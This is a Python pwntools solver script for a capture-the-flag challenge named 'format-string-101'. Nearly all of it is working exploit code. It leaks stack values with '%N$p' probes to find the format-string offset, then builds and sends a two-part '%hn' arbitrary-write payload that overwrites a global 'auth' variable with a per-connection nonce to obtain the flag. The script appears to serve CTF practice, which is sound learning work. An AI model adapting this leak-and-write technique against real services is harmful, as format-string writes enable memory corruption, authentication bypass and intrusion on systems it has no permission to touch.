#!/usr/bin/env python3
"""Working solver for format-string-101 (leak + write).

Strategy
--------
1. Read the banner. The service tells us two live values per connection:
     - the address of the global `auth` cell (stable; binary is -no-pie), and
     - this connection's random target `nonce` (fresh every connection, so a
       replayed payload is useless -- we build the write live).
2. Discover our format-string argument offset by leaking the stack: send a
   known 8-byte marker followed by "%N$p" probes and find where the marker
   reappears. (For this build it is 6.)
3. Build a %hn write of the 32-bit nonce into &auth using pwntools'
   fmtstr_payload, send it, and read back the flag the service prints once it
   has verified the effect (auth == nonce).

Usage
-----
    python3 solve.py                 # spawns ./chall locally (FLAG env optional)
    python3 solve.py HOST PORT       # against the live per-team service

Requires pwntools:  pip install pwntools
"""
import sys
import re
import struct
from pwn import context, remote, process, u64

context.arch = "amd64"
context.log_level = "info"


def build_write(offset, addr, value):
    """Build a %hn payload that writes the 32-bit `value` into `addr`.

    We write two 16-bit halves (low @ addr, high @ addr+2), padding the format
    section to an 8-byte boundary and appending the two target pointers so they
    land on aligned stack slots. We solve for the fixpoint where the pointer
    slots' argument index equals what the "%N$hn" directives reference -- this
    sidesteps library-specific offset conventions and works for this layout.
    """
    lo = value & 0xFFFF
    hi = (value >> 16) & 0xFFFF
    order = [(addr, lo), (addr + 2, hi)]
    order.sort(key=lambda t: t[1])          # ascending so %c counts only grow

    def make(base):
        s, cur = b"", 0
        for i, (_, v) in enumerate(order):
            need = (v - cur) % 0x10000
            if need:
                s += b"%" + str(need).encode() + b"c"
            s += b"%" + str(base + i).encode() + b"$hn"
            cur = v
        return s

    for guess in range(offset, offset + 40):
        s = make(guess)
        s += b"A" * ((-len(s)) % 8)          # pad format section to 8 bytes
        base_arg = offset + len(s) // 8
        if base_arg == guess:                # fixpoint: pointers sit at `guess`
            return s + b"".join(struct.pack("<Q", a) for a, _ in order)
    raise RuntimeError("could not find a stable payload layout")

MARKER = b"MARKER!!"          # 8 bytes, aligned when placed first
MARKER_HEX = u64(MARKER)      # 0x2121... little-endian view we search for


def connect():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    # local fallback: run the binary from the challenge dir (one level up).
    # Provide a FLAG env if you want it to print a flag on success.
    return process(["../chall"])


def read_banner(io):
    data = io.recvuntil(b"[ 0] > ")
    txt = data.decode(errors="replace")
    addr = int(re.search(r"auth' lives at (0x[0-9a-f]+)", txt).group(1), 16)
    nonce = int(re.search(r"auth == (0x[0-9a-f]+)", txt).group(1), 16)
    return addr, nonce


def find_offset(io):
    """Leak the stack to locate our controlled buffer. Returns the $-index."""
    # Probe indices 1..20. Tokens are '.'-separated so each maps 1:1 to %i$p
    # even when a slot leaks "(nil)" (which a bare 0x-regex would silently drop
    # and throw the index off by one).
    io.sendline(MARKER + b"|" + b".".join(b"%%%d$p" % i for i in range(1, 21)))
    line = io.recvline_contains(b"|").decode(errors="replace")
    tail = line.split("|", 1)[1]
    tokens = tail.split(".")
    for i, tok in enumerate(tokens, start=1):
        tok = tok.strip()
        try:
            val = 0 if tok in ("(nil)", "") else int(tok, 16)
        except ValueError:
            continue
        if val == MARKER_HEX:
            return i
    raise RuntimeError("offset not found in leak: %r" % line)


def main():
    io = connect()
    auth_addr, nonce = read_banner(io)
    log = context.log_level
    print(f"[*] auth @ {auth_addr:#x}   target nonce = {nonce:#010x}")

    offset = find_offset(io)
    print(f"[*] format-string offset = {offset}")

    # Write the full 32-bit nonce into &auth (two 16-bit %hn writes).
    payload = build_write(offset, auth_addr, nonce)
    assert len(payload) < 256, "payload too long for the 256-byte buffer"
    io.sendline(payload)

    io.recvuntil(b"flag: ", timeout=15)
    flag = io.recvline().strip().decode(errors="replace")
    print(f"[+] FLAG: {flag}")
    io.close()


if __name__ == "__main__":
    main()
